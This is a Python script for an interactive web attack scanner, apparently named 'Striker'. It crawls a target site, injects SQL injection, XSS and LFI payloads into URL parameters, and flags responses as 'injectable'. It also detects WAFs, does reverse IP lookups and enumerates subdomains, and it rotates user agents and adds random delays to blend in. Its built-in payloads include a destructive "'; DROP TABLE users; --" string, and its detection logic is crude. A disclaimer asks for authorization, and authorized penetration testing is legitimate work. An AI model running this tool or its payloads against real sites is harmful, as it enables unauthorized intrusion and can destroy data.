import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import csv
import os
import time
import socket
import random
import re
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36 Edg/125.0.2535.51",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; ARM Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Mobile Safari/537.36 SamsungBrowser/24.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36 OPR/110.0.5168.42"
]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS)
    }

def delay():
    time.sleep(random.uniform(0.5, 2.0))

def load_payloads(path=None):
    if path and os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            payloads = [line.strip() for line in f if line.strip()]
            print(f"{Fore.YELLOW}[*] Loaded {len(payloads)} payloads from {path}{Style.RESET_ALL}")
            return payloads
    default_payloads = ["'", "' OR '1'='1", "'; DROP TABLE users; --"]
    print(f"{Fore.YELLOW}[!] Payload file not found, uploading default payloads... ({len(default_payloads)}).{Style.RESET_ALL}")
    return default_payloads

def get_all_links(base_url):
    try:
        response = requests.get(base_url, headers=get_headers(), timeout=10)
    except Exception as e:
        print(f"[!] Error while downloading: {e}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    links = set()
    base_netloc = urlparse(base_url).netloc

    for tag in soup.find_all('a', href=True):
        full_url = urljoin(base_url, tag['href'])
        parsed = urlparse(full_url)
        if parsed.netloc == base_netloc:
            links.add(full_url)

    return list(links)

def filter_links_with_params(links):
    filtered = [link for link in links if '?' in link]
    print(f"{Fore.CYAN}[*] Link with parameters, found: {len(filtered)}{Style.RESET_ALL}")
    return filtered

def is_significantly_different(resp1, resp2):
    if not resp1 or not resp2:
        return False
    len1, len2 = len(resp1), len(resp2)
    if len1 == 0 or len2 == 0:
        return False
    diff_ratio = abs(len1 - len2) / max(len1, len2)
    return diff_ratio > 0.2

def is_vulnerable(injected_text, normal_text):
    common_errors = ["sql", "syntax", "mysql", "you have an error", "warning", "xss", "<script", "etc/passwd"]
    injected_text = injected_text.lower()
    if any(error in injected_text for error in common_errors):
        return True
    return is_significantly_different(injected_text, normal_text)

def test_single_url(link, payloads, writer=None):
    parsed = urlparse(link)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query)
    normal_response = None
    vulnerable_links = []

    for key in params:
        for payload in payloads:
            new_params = params.copy()
            new_params[key] = payload
            try:
                injected_url = requests.Request('GET', base, params=new_params).prepare().url
                delay()
                resp_payload = requests.get(injected_url, headers=get_headers(), timeout=10)

                if not normal_response:
                    normal_url = requests.Request('GET', base, params=params).prepare().url
                    delay()
                    normal_response = requests.get(normal_url, headers=get_headers(), timeout=10)

                is_vuln = is_vulnerable(resp_payload.text, normal_response.text)

                if is_vuln:
                    print(Fore.GREEN + f"[injectable] {injected_url} [{resp_payload.status_code}]")
                    vulnerable_links.append(injected_url)
                    if writer:
                        writer.writerow(["injectable", injected_url, time.strftime('%Y-%m-%d %H:%M:%S')])
                else:
                    print(Fore.RED + f"[not injectable] {injected_url} [{resp_payload.status_code}]")
                    if writer:
                        writer.writerow(["not injectable", injected_url, time.strftime('%Y-%m-%d %H:%M:%S')])
            except Exception as e:
                print(f"[!] Error on {injected_url}: {e}")
    return vulnerable_links

def prepare_csv(filename):
    f = open(filename, 'w', newline='', encoding='utf-8')
    writer = csv.writer(f)
    writer.writerow(["Status", "URL", "Timestamp"])
    return f, writer

def detect_waf(url):
    try:
        response = requests.get(url, headers=get_headers(), timeout=10)
        headers = response.headers
        waf_signatures = [
            "X-Sucuri-ID", "X-Akamai-Transformed", "X-CDN", "X-Frame-Options", "X-Mod-Security",
            "Server: cloudflare", "X-Powered-By-AspNet", "X-Distil-CS"
        ]
        print("\n[WAF DETECTION]")
        found = False
        for key, value in headers.items():
            for sig in waf_signatures:
                if sig.lower() in key.lower() or sig.lower() in value.lower():
                    print(f"{Fore.GREEN}[+] Potential WAF detected: {key}: {value}{Style.RESET_ALL}")
                    found = True
        if not found:
            print(f"{Fore.YELLOW}[-] No WAF detected in common headers.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] WAF Detection Error: {e}{Style.RESET_ALL}")

def reverse_ip_lookup(domain):
    print("\n[REVERSE IP]")
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] Domain IP {domain}: {ip}")
        url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
        resp = requests.get(url, headers=get_headers(), timeout=10)
        if "error" in resp.text.lower():
            print(f"{Fore.RED}[!] Error from Reverse IP service: {resp.text}{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[+] Domains found on IP {ip}:{Style.RESET_ALL}\n{resp.text}")
    except Exception as e:
        print(f"{Fore.RED}[!] Reverse IP error: {e}{Style.RESET_ALL}")

def crawl_recursive(url, depth=3, visited=None):
    if visited is None:
        visited = set()
    if depth == 0 or url in visited:
        return visited
    try:
        response = requests.get(url, headers=get_headers(), timeout=10)
        visited.add(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for tag in soup.find_all("a", href=True):
            full_url = urljoin(url, tag["href"])
            if urlparse(full_url).netloc == urlparse(url).netloc:
                crawl_recursive(full_url, depth-1, visited)
    except:
        pass
    return visited

def enumerate_subdomains(domain):
    print(f"{Fore.MAGENTA}\n[+] Subdomain enumeration for {domain}...{Style.RESET_ALL}")
    subdomains = []
    wordlist = ["www", "mail", "ftp", "webmail", "cpanel", "dev", "test", "api", "data", "upload", "admin", "login"]
    for sub in wordlist:
        subdomain = f"{sub}.{domain}"
        try:
            socket.gethostbyname(subdomain)
            print(f"{Fore.GREEN}[+] Subdomain found: {subdomain}{Style.RESET_ALL}")
            subdomains.append(f"http://{subdomain}")
        except:
            pass
    return subdomains

def main_menu():
    while True:
        print(f"""
{Fore.YELLOW} ___{Style.RESET_ALL}
{Fore.YELLOW}__H__     {Fore.WHITE}     Advanced Vulnerability Scanner {Style.RESET_ALL}
{Fore.YELLOW} [{Fore.RED},{Fore.YELLOW}]{Style.RESET_ALL}
{Fore.YELLOW} [{Fore.RED}){Fore.YELLOW}]{Style.RESET_ALL}
{Fore.YELLOW} [{Fore.RED};{Fore.YELLOW}]  Striker{Style.RESET_ALL}
{Fore.YELLOW} |_|{Fore.RED}    ⱽ¹ˑ⁷_ˣᴾˡᵒⁱᵗˢ³ᶜ{Style.RESET_ALL}
{Fore.YELLOW}  V{Style.RESET_ALL}
{Fore.RED}[!] Disclaimer: {Fore.YELLOW}Attacking targets without prior mutual consent is illegal.{Style.RESET_ALL}
{Fore.RED}[!]{Fore.YELLOW} Use the tool only on sites you own or with explicit authorization.{Style.RESET_ALL}
{Fore.RED}[!]{Fore.YELLOW} It is the end user's responsibility to obey all applicable local, state and federal laws.{Style.RESET_ALL}
{Fore.BLUE}================{Style.RESET_ALL}
1){Fore.YELLOW} SQL{Fore.RED} Injection{Style.RESET_ALL}
2){Fore.YELLOW} XSS{Fore.RED} Injection{Style.RESET_ALL}
3){Fore.YELLOW} LFI{Fore.RED} Injection{Style.RESET_ALL}
4){Fore.YELLOW} Advanced{Style.RESET_ALL} Scan
5){Fore.YELLOW} WAF Detection{Style.RESET_ALL} &{Fore.YELLOW} Reverse IP{Style.RESET_ALL}
6){Fore.YELLOW} Crawler{Style.RESET_ALL} ({Fore.BLUE}--level=3{Style.RESET_ALL})
7){Fore.YELLOW} Subdomain{Style.RESET_ALL} Scan
0){Fore.RED} Exit{Style.RESET_ALL}
""")
        scelta = input("Select an option: ")
        if scelta in ["1", "2", "3", "4"]:
            target = input("Enter URL with parameter: ").strip()
            links = get_all_links(target)
            links = filter_links_with_params(links)
            if not links:
                print(f"{Fore.RED}[!] No link with parameters found. Stopping the scan.{Style.RESET_ALL}")
                continue
            if scelta == "1":
                payloads = load_payloads("sqli_payloads.txt")
            elif scelta == "2":
                payloads = load_payloads("xss_payloads.txt")
            elif scelta == "3":
                payloads = load_payloads("lfi_payloads.txt")
            else:
                path = input("Custom payload file path: ").strip()
                payloads = load_payloads(path)
            f, writer = prepare_csv("scan_results.csv")
            for link in links:
                test_single_url(link, payloads, writer)
            f.close()
            print("[+] Scan completed. Results saved in scan_results.csv")
        elif scelta == "5":
            target = input("Enter URL (es. https://example.com): ").strip()
            detect_waf(target)
            reverse_ip_lookup(urlparse(target).hostname)
        elif scelta == "6":
            target = input("Enter the starting URL: ").strip()
            print("{Fore.RED}[*]{Fore.YELLOW} Crawling at depth 3{Fore.GREEN}...{Style.RESET_ALL}")
            results = crawl_recursive(target, depth=3)
            with open("crawler_output.csv", "w", encoding="utf-8") as f:
                for url in sorted(results):
                    print(url)
                    f.write(url + "\n")
            print(f"[+] Crawling completed. {len(results)} URLs saved in crawler_output.csv")
        elif scelta == "7":
            domain = input("Enter domain (es. example.com): ").strip()
            found = enumerate_subdomains(domain)
            with open("subdomains_found.csv", "w", encoding="utf-8") as f:
                for sub in found:
                    f.write(sub + "\n")
                    print(f"[+] Subdomain scan completed. Results saved in subdomains_found.csv")
        elif scelta == "0":
            print("Exiting the program.")
            break
        else:
            print("[!] Invalid option!")

if __name__ == "__main__":
    main_menu()
